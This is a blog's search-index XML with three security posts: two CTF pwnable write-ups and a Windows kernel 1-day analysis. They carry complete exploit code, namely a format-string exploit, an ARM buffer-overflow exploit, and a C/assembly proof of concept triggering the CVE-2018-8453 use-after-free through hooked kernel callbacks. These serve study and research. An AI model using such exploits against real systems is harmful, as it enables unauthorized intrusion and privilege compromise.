<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020 BoB CTF </title>
    <url>/2020/10/02/2020-10-03-BoB_CTF_2020/</url>
    <content><![CDATA[<center>2020 BoB CTF Write-up </center>


<h1 id="porn-master-pwnable"><a href="#porn-master-pwnable" class="headerlink" title="porn_master (pwnable)"></a>porn_master (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It is the porn_master on BoB9 CTF.  let’s check protection.<br><img src="https://user-images.githubusercontent.com/70257118/91448805-502be500-e8b5-11ea-9e24-98c756b7c800.png" alt="1"><br>It is full protection. then we should know pie-base and libc-base when we exploit it.<br>let’s see the binary on IDA!</p>
<span id="more"></span>
<p><img src="https://user-images.githubusercontent.com/70257118/91447645-e0692a80-e8b3-11ea-82af-cd776583bc13.png" alt="image"><br>we can find format string bug on line 28.  but we can only write 0x18 at once to buf.<br>and also we can write two times because of the <code>for loop</code> on line 24.<br>so first time we need to leak pie_addr and libc_addr on stack. then we can get its base_addr.<br>and second time we overwrite <code>printf_ret_addr</code> to <code>printf_addr</code> on  line 21(It is pie_addr).<br>then we jump to line21. we have two opportunities to use format string bug again.<br>according to this, we can make many opportunities, if we overwrite <code>print_ret_addr</code>.<br>we can’t overwrite got because of full relro. so we should overwrite __malloc_hook.<br>let’s overwrite __malloc_hook to oneshot gadget  and get flag!</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;52.79.163.146&#x27;, 12002)</span></span><br><span class="line">p = process(<span class="string">&#x27;./porn_master&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./porn_master&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;lk:%19$p:%17$p:%16$p::&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lk:&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">pie_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libcbase = libc_leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">231</span></span><br><span class="line">piebase = pie_leak - <span class="number">0xa60</span></span><br><span class="line"></span><br><span class="line">printf_ret = stack_leak - <span class="number">0x140</span></span><br><span class="line">main_ret = stack_leak - <span class="number">0xe0</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base : &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&#x27;pie_base : &#x27;</span> + <span class="built_in">hex</span>(piebase))</span><br><span class="line">log.info(<span class="string">&#x27;printf_ret : &#x27;</span> + <span class="built_in">hex</span>(printf_ret))</span><br><span class="line"></span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">oneshot = libcbase + <span class="number">0x4f365</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#log.info(hex(malloc_hook))</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(oneshot))</span><br><span class="line"></span><br><span class="line">printf = piebase + <span class="number">0x97c</span></span><br><span class="line"></span><br><span class="line">low = printf &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p64(printf_ret)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">low_main = oneshot &amp; <span class="number">0xffff</span></span><br><span class="line">high_main = (oneshot &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(low_main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(high_main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low_main)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;CCC&#x27;</span></span><br><span class="line">payload += p64(main_ret)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p64(printf_ret)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(high_main)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;DDD&#x27;</span></span><br><span class="line">payload += p64(main_ret+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="comment">#p.sendafter(&#x27;&gt; &#x27;,&#x27;AAAA&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Write-up</tag>
        <tag>pwnable</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-8453</title>
    <url>/2020/12/02/2020-12-03-CVE-2018-8453/</url>
    <content><![CDATA[<center>CVE-2018-8453 // Windows Kernel 1-day</center> 


<h1 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h1><p>NtUserSetWindowFNID()는 FNID를 설정할 때,  Window가 release 됐는지 아닌지 확인하지 않음.</p>
<p>→ 따라서 이미 free된 Window에 FNID를 설정하여 재사용 할 수 있음.</p>
<p>이 취약점을 이용하여, xxSBTrackInit()에서 pSBTrack의 UAF를 발생시킬 수 있음.</p>
<span id="more"></span>
<h1 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h1><p><img src="https://user-images.githubusercontent.com/75205011/100963586-01ec4900-356a-11eb-830e-b11ce5f2afc3.png" alt="sdafasdf"></p>
<ul>
<li>먼저 KernelCallbackTable에 있는 2개의 callback을 Hook함. (fnDWORD, fnClientFree…)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span>.<span class="keyword">asm</span></span><br><span class="line">GetKernelCallbackTableBase PROC</span><br><span class="line">	;<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">	lea rax,[rax+<span class="number">58</span>h]</span><br><span class="line">	mov rax,[rax]</span><br><span class="line">	ret</span><br><span class="line">GetKernelCallbackTableBase ENDP</span><br><span class="line"></span><br><span class="line">Main.<span class="function">c</span></span><br><span class="line"><span class="function">	<span class="title">VirtualProtect</span><span class="params">(CallbackTb, <span class="number">512</span>, PAGE_READWRITE, &amp;OldProtect)</span></span>; <span class="comment">//메모리 보호 설정 값 변경</span></span><br><span class="line">	CallbackTb += <span class="number">2</span>;   <span class="comment">//Table에서의 Hook할 Callback의 위치.</span></span><br><span class="line">	fnDWORD = (fct_fnDispatch64)*CallbackTb;  <span class="comment">//Hook함수 설정.</span></span><br><span class="line">	*CallbackTb = (ULONG64)fnDWORDCallBack;  </span><br><span class="line"></span><br><span class="line">	CallbackTb += <span class="number">124</span>;</span><br><span class="line">	fnClientFreeWindowClassExtraBytes = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">	*CallbackTb = (ULONG64)fnClientFreeWindowClassExtraBytesCallBack; </span><br></pre></td></tr></table></figure>

<ul>
<li>Main Window와 ScrollBar 를 만듬.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Structure 설정.</span></span><br><span class="line">WNDCLASSEXW wcex;</span><br><span class="line">wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wcex.lpfnWndProc = DefWindowProc;</span><br><span class="line">wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wcex.cbWndExtra = <span class="number">4</span>;</span><br><span class="line">wcex.hInstance = <span class="number">0</span>;</span><br><span class="line">wcex.hIcon = LoadIcon(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wcex.lpszClassName = <span class="string">L&quot;WNDCLASSMAIN&quot;</span>;</span><br><span class="line">wcex.hIconSm = LoadIcon(wcex.hInstance, <span class="literal">NULL</span>);</span><br><span class="line">RegisterClassExW(&amp;wcex);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Main Window 생성.</span></span><br><span class="line">hMainWND = CreateWindowW(<span class="string">L&quot;WNDCLASSMAIN&quot;</span>, <span class="string">L&quot;CVE&quot;</span>, WS_DISABLED, <span class="number">2</span>, <span class="number">2</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//ScrollBar 생성.</span></span><br><span class="line">hSBWND = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, WS_CHILD | WS_VISIBLE | SBS_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, hMainWND, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>SendMessage()함수를 사용해 ScrollBar에 WM_LBUTTONDOWN 메시지를 보냄</p>
<p>  (이는 xxxSBTrackInit()함수 호출을 Trigger하기 위함)</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SendMessage(hSBWND, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0x00020002</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>xxxSBTrackLoop이 호출되어, 마우스 왼쪽 버튼이 해제되거나 다른 메시지가 수신될 때까지 루프에서 마우스 이벤트를 캡쳐함.</p>
</li>
<li><p>xxxSBTrackLoop이 실행되므로 fnDWORD가 Callback됨. (이때 미리 Hook한 fnDWORD가 실행됨)</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">		bMSGSENT = FALSE;</span><br><span class="line">		DestroyWindow(hMainWND); <span class="comment">//DestroyWindow함수를 이용해 Main Window를 파괴.</span></span><br><span class="line">		<span class="comment">//DestroyWindow 함수는 xxxFreeWindow함수를 호출.</span></span><br><span class="line">		<span class="comment">//xxxFreeWindow 함수는 먼저 Main Window의 FNID를 8000(free)으로 변경 함.</span></span><br><span class="line">		<span class="comment">//그리고 xxxClientFreeWindowClassExtraBytes를 호출.</span></span><br><span class="line">	&#125;</span><br><span class="line">	fnDWORD(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>xxxClientFreeWindowClass..함수는 Callback를 호출 (이때 미리 Hook한 fnClinet…가 실행됨)</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/75205011/100963641-247e6200-356a-11eb-8256-ac9c185b666c.png" alt="asd"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnClientFreeWindowClassExtraBytesCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (*(PULONG64)*((PULONG64)*(msg - <span class="number">11</span>)) == (ULONG64)hMainWND) &#123;</span><br><span class="line">		</span><br><span class="line">		hSBWNDnew = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, SWP_HIDEWINDOW | SB_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		SetWindowFNID(hMainWND, <span class="number">0x2A1</span>); <span class="comment">//이미Free된 Main Window의 FNID(0x2A1 ~ 0x2AAA)를 설정함.</span></span><br><span class="line">		SetCapture(hSBWNDnew); <span class="comment">//새로운 Window를 만들고, 이를 현재 thread에서 Capture하고 있는 window로 설정.</span></span><br><span class="line">		f3 = TRUE;</span><br><span class="line">	</span><br><span class="line">	&#125; </span><br><span class="line">	fnClientFreeWindowClassExtraBytes(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Main Window가 파괴됐기 때문에 xxxSBTrackLoop이 돌아와 HMAssignmentUnLock(&amp;pSBTrack-&gt;spwndNotify)을 계속 실행하여 Main Window를 완전히 해제하는 관련 역참조를 수행하는데, 이로 인해 xxxFreeWindow가 다시 호출됨.</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/75205011/100963660-306a2400-356a-11eb-8ecc-e28614b76662.png" alt="cdsf"></p>
<ul>
<li>Main Window의 FNID는 (xxxFreeWindow에서 8000(Free)되었다가,  fnClient..함수에서 82A1로 설정 되었음.) 따라서 SfnDWORD함수가 호출되며 이는 아까 hook했던 fnDWORD가 다시 호출됨.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">		bMSGSENT = FALSE;</span><br><span class="line">		DestroyWindow(hMainWND); </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*msg &amp;&amp; (*(msg + <span class="number">1</span>) == <span class="number">0x70</span>) &amp;&amp; (*((PULONG64)(*msg)) == (ULONG64)hMainWND)) &#123;</span><br><span class="line">		SendMessage(hSBWNDnew, WM_CANCELMODE, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//여기서 WM_CANCELMODE를 사용하여,</span></span><br><span class="line">		<span class="comment">//pSBTrack을 free함.</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fnDWORD(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>POC 프로그램은 단일 스레드이기 때문에 스레드에 의해 생성된 모든 창은 동일한 스레드 정보 구조를 가리킨다. SBTrack이 속해 있는 Scrollbar 창이 해제되었더라도, 동일한 스레드에 의해 새 창이 생성되는 한, pSBTrack은 여전히 동일한 창을 가리키고 있다.</li>
<li>setCaputure(hSBWNDNew)를 호출하여 hSBTWNDNDNew 창에서 마우스 이벤트를 캡처하기 위해 현재 스레드를 설정했다. 마지막으로, UserFreePool(pSBTrack)이 pSBTrack을 릴리스하기 위해 실행되어 HMAssignmentUnLock(&amp;pSBTrack-&gt;spwnd를 실행하기 전에 pSBTrack을 해제함SB) 및 결과 pSBTrack에 After Free.</li>
<li>Usermode에서 pSBTrack을 Free했다.</li>
<li>정상적인 흐름은  xxxSBTrackLoop가 끝난 후  xxxSBTrackInit()에서 Free 시켜야 하지만, 미리 UserMode에서 Free 해버렸으므로, 이후에 pSBTrack에 대한 UAF가 발생함.</li>
</ul>
<h1 id="Windbg-analyze"><a href="#Windbg-analyze" class="headerlink" title="Windbg !analyze"></a>Windbg !analyze</h1><p><img src="https://user-images.githubusercontent.com/75205011/100963679-3eb84000-356a-11eb-9045-821cd77c38ec.png" alt="asdf"></p>
<p><img src="https://user-images.githubusercontent.com/75205011/100963690-47107b00-356a-11eb-95b0-3e89d376161a.png" alt="xv"></p>
<h1 id="POC-code"><a href="#POC-code" class="headerlink" title="POC code."></a>POC code.</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;targetver.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL			f3 = FALSE;</span><br><span class="line">BOOL			bMSGSENT = FALSE;</span><br><span class="line">HWND			hMainWND;</span><br><span class="line">HWND			hSBWND;</span><br><span class="line">HWND			hSBWNDnew;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C PULONG64 <span class="title">GetKernelCallbackTableBase</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">SetWindowFNID</span><span class="params">(HWND hWnd, LONG64 FNID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span>  <span class="title">ULONG64</span><span class="params">(WINAPI *fct_fnDispatch64)</span><span class="params">(PULONG64)</span></span>;</span><br><span class="line">fct_fnDispatch64 fnDWORD, fnClientFreeWindowClassExtraBytes;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">		bMSGSENT = FALSE;</span><br><span class="line">		DestroyWindow(hMainWND);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((f3==TRUE) &amp;&amp; (*(msg + <span class="number">1</span>) == <span class="number">0x70</span>) &amp;&amp; (*((PULONG64)(*msg)) == (ULONG64)hMainWND)) &#123;</span><br><span class="line">		</span><br><span class="line">		SendMessage(hSBWNDnew, WM_CANCELMODE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	fnDWORD(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnClientFreeWindowClassExtraBytesCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (*(PULONG64)*((PULONG64)*(msg - <span class="number">11</span>)) == (ULONG64)hMainWND) &#123;</span><br><span class="line">		</span><br><span class="line">		hSBWNDnew = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, SWP_HIDEWINDOW | SB_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		SetWindowFNID(hMainWND, <span class="number">0x2A1</span>);</span><br><span class="line">		SetCapture(hSBWNDnew);</span><br><span class="line">		f3 = TRUE;</span><br><span class="line">	&#125; </span><br><span class="line">	fnClientFreeWindowClassExtraBytes(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD		OldProtect = <span class="number">0</span>;</span><br><span class="line">	PULONG64	CallbackTb = GetKernelCallbackTableBase();</span><br><span class="line">	</span><br><span class="line">	VirtualProtect(CallbackTb, <span class="number">512</span>, PAGE_READWRITE, &amp;OldProtect);</span><br><span class="line">	CallbackTb += <span class="number">2</span>;</span><br><span class="line">	fnDWORD = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">	*CallbackTb = (ULONG64)fnDWORDCallBack;</span><br><span class="line"></span><br><span class="line">	CallbackTb += <span class="number">124</span>;</span><br><span class="line">	fnClientFreeWindowClassExtraBytes = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">	*CallbackTb = (ULONG64)fnClientFreeWindowClassExtraBytesCallBack;</span><br><span class="line"></span><br><span class="line">	WNDCLASSEXW wcex;</span><br><span class="line">	wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">	wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">	wcex.lpfnWndProc = DefWindowProc;</span><br><span class="line">	wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">	wcex.cbWndExtra = <span class="number">4</span>;</span><br><span class="line">	wcex.hInstance = <span class="number">0</span>;</span><br><span class="line">	wcex.hIcon = LoadIcon(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">	wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">	wcex.lpszClassName = <span class="string">L&quot;WNDCLASSMAIN&quot;</span>;</span><br><span class="line">	wcex.hIconSm = LoadIcon(wcex.hInstance, <span class="literal">NULL</span>);</span><br><span class="line">	RegisterClassExW(&amp;wcex); </span><br><span class="line"></span><br><span class="line">	hMainWND = CreateWindowW(<span class="string">L&quot;WNDCLASSMAIN&quot;</span>, <span class="string">L&quot;CVE&quot;</span>, WS_DISABLED, <span class="number">2</span>, <span class="number">2</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hSBWND = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, WS_CHILD | WS_VISIBLE | SBS_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, hMainWND, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	bMSGSENT = TRUE;</span><br><span class="line">	</span><br><span class="line">	SendMessage(hSBWND, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0x00020002</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> GetKernelCallbackTableBase</span><br><span class="line"><span class="keyword">public</span> FuncInt3</span><br><span class="line"><span class="keyword">public</span> SetWindowFNID </span><br><span class="line">_TEXT SEGMENT</span><br><span class="line"></span><br><span class="line">GetKernelCallbackTableBase PROC</span><br><span class="line">	;<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">	lea rax,[rax+<span class="number">58</span>h]</span><br><span class="line">	mov rax,[rax]</span><br><span class="line">	ret</span><br><span class="line">GetKernelCallbackTableBase ENDP</span><br><span class="line"></span><br><span class="line">SetWindowFNID PROC</span><br><span class="line">		mov r10,rcx;</span><br><span class="line">		mov r11,rdx;</span><br><span class="line">		mov eax,<span class="number">1095</span>h;</span><br><span class="line">		syscall;</span><br><span class="line">		ret;</span><br><span class="line">SetWindowFNID ENDP</span><br><span class="line"></span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://bbs.pediy.com/thread-249021.htm">https://bbs.pediy.com/thread-249021.htm</a></p>
]]></content>
      <categories>
        <category>Research</category>
      </categories>
      <tags>
        <tag>1-day</tag>
        <tag>Windows Kernel</tag>
        <tag>UAF</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 X-mas CTF </title>
    <url>/2020/12/24/2020-12-25-XMAS_CTF_2020/</url>
    <content><![CDATA[<center>2020 X-mas CTF Write-up </center>


<h1 id="Baby-Rudolph-pwnable"><a href="#Baby-Rudolph-pwnable" class="headerlink" title="Baby_Rudolph (pwnable)"></a>Baby_Rudolph (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png" alt="image"></p>
<p>There is Buffer Overflow in <code>vuln function</code>. It is triggered by calling <code>read</code>.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png" alt="image"></p>
<p>And Using <code>get_arm</code> function, we can get the sh. So it is easy bof. just overwrite retur address to <code>get_arm</code>.</p>
<span id="more"></span>
<p><img src="https://user-images.githubusercontent.com/49066484/110240678-6f0be200-7f90-11eb-9e34-da677cef49ef.png" alt="image"></p>
<p>We need ARM, because the binary  is for ARM architecture. So They gave docker. but it didn’t work. I used qemu for constructing  analysis environment.<br><code>/usr/bin/qemu-system-aarch64 -M virt -cpu cortex-a57 -m 128 -kernel ./kernel -initrd ./rootfs -nographic -serial mon:stdio -append console=ttyAMA0</code></p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;host7.dreamhack.games&#x27;</span>,<span class="number">17341</span>)</span><br><span class="line">get_arm = <span class="number">0x400680</span></span><br><span class="line">argv = <span class="number">0x1225</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(get_arm)</span><br><span class="line">payload += p64(argv)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ARM...!\N&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


